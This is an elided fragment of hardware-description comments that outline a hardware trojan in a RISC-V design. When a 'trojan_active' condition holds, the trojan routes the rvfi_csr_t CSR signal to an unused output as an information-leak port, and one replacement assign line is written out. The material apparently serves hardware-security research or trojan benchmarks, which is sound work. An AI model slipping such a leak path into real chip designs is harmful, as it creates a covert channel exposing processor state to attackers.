 ...
 * Payload: Route rvfi_csr_t to leak port
 * 
...
// ============================================================
// Information Leak: Route rvfi_csr_t to unused output
//
...
//   Replace: assign output_signal = trojan_active ? rvfi_csr_t : normal_value;